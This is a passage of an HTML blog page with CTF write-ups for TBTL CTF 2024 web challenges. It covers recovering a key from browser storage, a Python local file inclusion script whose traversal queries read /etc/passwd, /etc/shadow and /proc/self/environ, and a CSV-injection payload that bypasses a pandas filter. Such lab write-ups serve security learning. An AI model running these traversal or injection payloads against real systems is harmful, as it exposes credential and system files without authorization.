@@ -1,0 +1,683 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>TBTL CTF 2024 - web(4x) writeups - xeunwa</title><meta name="Description" content="indexedDB, LFI, CSV, Boolean-based Neo4j Injection"><meta property="og:url" content="https://xeunwa.github.io/tbtlctf-2024/">
+  <meta property="og:site_name" content="xeunwa">
+  <meta property="og:title" content="TBTL CTF 2024 - web(4x) writeups">
+  <meta property="og:description" content="indexedDB, LFI, CSV, Boolean-based Neo4j Injection">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-05-12T02:46:00+08:00">
+    <meta property="article:modified_time" content="2024-05-12T02:46:00+08:00">
+    <meta property="article:tag" content="IndexedDB">
+    <meta property="article:tag" content="GraphQL">
+    <meta property="article:tag" content="Neo4J">
+    <meta property="article:tag" content="Pandas">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Code Review">
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+  <meta name="twitter:title" content="TBTL CTF 2024 - web(4x) writeups">
+  <meta name="twitter:description" content="indexedDB, LFI, CSV, Boolean-based Neo4j Injection">
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://xeunwa.github.io/tbtlctf-2024/" /><link rel="prev" href="https://xeunwa.github.io/umdctf-2024/" /><link rel="next" href="https://xeunwa.github.io/time-traveler/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TBTL CTF 2024 - web(4x) writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/xeunwa.github.io\/tbtlctf-2024\/"
+        },"image": ["https:\/\/xeunwa.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "indexedDB, GraphQL, Neo4J, pandas, python, code-review, lfi, php","wordcount":  903 ,
+        "url": "https:\/\/xeunwa.github.io\/tbtlctf-2024\/","datePublished": "2024-05-12T02:46:00+08:00","dateModified": "2024-05-12T02:46:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/avatars.githubusercontent.com\/u\/72879902?v=4"},"authors": [{
+                        "@type": "Person",
+                        "name": "xeunwa"                    
+                    }],"description": "indexedDB, LFI, CSV, Boolean-based Neo4j Injection"
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('black' === 'light' || 'black' === 'dark' || 'black' === 'black') setTheme('black'), saveTheme('black'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/categories/ctf/"> Writeups </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/whoami/"> whoami </a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/categories/ctf/" title="">Writeups</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/whoami/" title="">whoami</a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#webbutterfly">web/Butterfly</a></li>
+    <li><a href="#webtalk-to-you">web/Talk-to-you</a></li>
+    <li><a href="#webrnd-for-data-science">web/RND for DATA Science</a></li>
+    <li><a href="#webmexico-city-tour">web/Mexico City Tour</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TBTL CTF 2024 - web(4x) writeups</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><span class="author fas fa-user-circle fa-fw"></span><span class='screen-reader-text'>  </span><a href='https://xeunwa.github.io/authors/xeunwa'>xeunwa</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-05-12">2024-05-12</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-05-12">2024-05-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;903 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#webbutterfly">web/Butterfly</a></li>
+    <li><a href="#webtalk-to-you">web/Talk-to-you</a></li>
+    <li><a href="#webrnd-for-data-science">web/RND for DATA Science</a></li>
+    <li><a href="#webmexico-city-tour">web/Mexico City Tour</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Writeups for solved <a href="https://ctftime.org/event/2324" target="_blank" rel="noopener noreferrer">TBTL CTF 2024</a> challenges</p>
+<p>Solved 4/4 web challenges which is nice</p>
+<p><strong>points</strong>: 600  <strong>rank</strong>: 96/791</p>
+<hr>
+<h1 id="webbutterfly" class="headerLink">
+    <a href="#webbutterfly" class="header-mark"></a>web/Butterfly</h1><p><code>#indexDB</code> <code>#local-storage</code> <code>#session-storage</code></p>
+<blockquote>
+<p>We&rsquo;ve noticed some unusual communication occurring on a particular website. Could you assist in uncovering any hidden secrets being exchanged through this seemingly innocent platform?</p>
+</blockquote>
+<p><a href="https://tbtl-butterfly.chals.io/" target="_blank" rel="noopener noreferrer">https://tbtl-butterfly.chals.io/</a></p>
+<p>indexdb had some suspicious looking data (flag)
+<figure><a class="lightgallery" href="/tbtlctf-2024/image-1.png" title="Alt text" data-thumbnail="/tbtlctf-2024/image-1.png">
+        <img
+            
+            loading="lazy"
+            src="/tbtlctf-2024/image-1.png"
+            srcset="/tbtlctf-2024/image-1.png, /tbtlctf-2024/image-1.png 1.5x, /tbtlctf-2024/image-1.png 2x"
+            sizes="auto"
+            alt="Alt text" height="451"  width="1233" >
+    </a></figure>
+<code>U2FsdGVkX19wWL7itIL7TZcLTP/e1ulrZolI9AHTA8OBGOCodbZKdOxPF41rGV9C+X7PZPt9ISJKQMpTl+Fwew==</code></p>
+<p>Local storage stored some source code</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;code&#34;:&#34;CryptoJS.AES.decrypt(CIPHERTEXT, KEY).toString(CryptoJS.enc.Utf8)&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Session storage stored the secret AES key!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">secret key is very secure
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From this we have the algo, key and the ciphertext. We can decrypt it in JS</p>
+<p>console.js</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">CIPHERTEXT</span> <span class="o">=</span> <span class="s2">&#34;U2FsdGVkX19wWL7itIL7TZcLTP/e1ulrZolI9AHTA8OBGOCodbZKdOxPF41rGV9C+X7PZPt9ISJKQMpTl+Fwew==&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">KEY</span> <span class="o">=</span> <span class="s2">&#34;secret key is very secure&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">CIPHERTEXT</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag: <strong>TBTL{th15_1S_n0t_53CUR3_5T0r4G3}</strong></p>
+<h1 id="webtalk-to-you" class="headerLink">
+    <a href="#webtalk-to-you" class="header-mark"></a>web/Talk-to-you</h1><p><code>#lfi</code></p>
+<p>LFI challenge that has a <code>test.php</code> rabbit hole
+<figure><a class="lightgallery" href="/tbtlctf-2024/image-2.png" title="Alt text" data-thumbnail="/tbtlctf-2024/image-2.png">
+        <img
+            
+            loading="lazy"
+            src="/tbtlctf-2024/image-2.png"
+            srcset="/tbtlctf-2024/image-2.png, /tbtlctf-2024/image-2.png 1.5x, /tbtlctf-2024/image-2.png 2x"
+            sizes="auto"
+            alt="Alt text" height="551"  width="819" >
+    </a></figure></p>
+<p>Standard files can be found and if we just look around we can find the flag stored in <code>database.sqlite</code>.</p>
+<p>solve script</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://tbtl-talk-to-you.chals.io/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;?page=/../ctf/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;?page=/../../../../../../../../../../proc/self/environ&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;?page=/../../../../../../../../../../etc/passwd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;?page=/../../../../../../../../../../etc/shadow&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;?page=/../../../../../../../../../../flag.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;?page=database.sqlite&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># query=&#34;?page=php://filter/convert.base64-encode/resource=/etc/test.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">query</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># r = requests.get(test)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- ![Alt text](image-5.png) -->
+<p><a class="lightgallery" href="/tbtlctf-2024/image-5.png" title="/tbtlctf-2024/image-5.png" data-thumbnail="/tbtlctf-2024/image-5.png">
+        <img
+            
+            loading="lazy"
+            src="/tbtlctf-2024/image-5.png"
+            srcset="/tbtlctf-2024/image-5.png, /tbtlctf-2024/image-5.png 1.5x, /tbtlctf-2024/image-5.png 2x"
+            sizes="auto"
+            alt="/tbtlctf-2024/image-5.png" height="455"  width="100%" >
+    </a>
+flag: <strong>TBTL{4Typ1c41_d4T4B453_u54g3}</strong></p>
+<h1 id="webrnd-for-data-science" class="headerLink">
+    <a href="#webrnd-for-data-science" class="header-mark"></a>web/RND for DATA Science</h1><p><code>#csv-injection</code> <code>#pandas</code></p>
+<p>I guess theres some CSV Injection to trick intended pandas query</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">StringIO</span><span class="p">,</span> <span class="n">BytesIO</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">app</span><span class="o">.</span><span class="n">send_static_file</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/generate&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delimiter_const</span> <span class="o">=</span> <span class="s1">&#39;delimiter&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:5001&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s1">&#39;ERROR&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;ERROR&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">csv</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="n">csv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Filter out secrets</span>
+</span></span><span class="line"><span class="cl">    <span class="n">first</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">df</span><span class="o">.</span><span class="n">columns</span><span class="o">.</span><span class="n">values</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">df</span> <span class="o">=</span> <span class="n">df</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first</span><span class="si">}</span><span class="s1"> != &#34;FLAG&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">string_df</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">(</span><span class="n">df</span><span class="o">.</span><span class="n">to_csv</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">sep</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="n">delimiter_const</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bytes_df</span> <span class="o">=</span> <span class="n">BytesIO</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bytes_df</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">string_df</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bytes_df</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">bytes_df</span><span class="p">,</span> <span class="n">download_name</span><span class="o">=</span><span class="s2">&#34;data.csv&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The important code here is the filtering of 2nd column, if we manage to move the columns before insert we can leak the flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="c1"># Filter out secrets</span>
+</span></span><span class="line"><span class="cl">    <span class="n">first</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">df</span><span class="o">.</span><span class="n">columns</span><span class="o">.</span><span class="n">values</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">df</span> <span class="o">=</span> <span class="n">df</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first</span><span class="si">}</span><span class="s1"> != &#34;FLAG&#34;&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we send newline <code>\n</code> and <code>,</code> the resulting CSV table will be moved and the word <code>FLAG</code> will move to the first column</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://tbtl-rnd-for-data-science.chals.io/generate&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;numColumns&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;columnName0&#34;</span><span class="p">:</span> <span class="s2">&#34;test</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;columnName1&#34;</span><span class="p">:</span> <span class="s2">&#34;rank,&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;delimiter&#34;</span><span class="p">:</span> <span class="s2">&#34;,&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- ![[Pasted image 20240512152316.png]] -->
+<a class="lightgallery" href="/tbtlctf-2024/image-6.png" title="/tbtlctf-2024/image-6.png" data-thumbnail="/tbtlctf-2024/image-6.png">
+        <img
+            
+            loading="lazy"
+            src="/tbtlctf-2024/image-6.png"
+            srcset="/tbtlctf-2024/image-6.png, /tbtlctf-2024/image-6.png 1.5x, /tbtlctf-2024/image-6.png 2x"
+            sizes="auto"
+            alt="/tbtlctf-2024/image-6.png" height="305"  width="100%" >
+    </a>
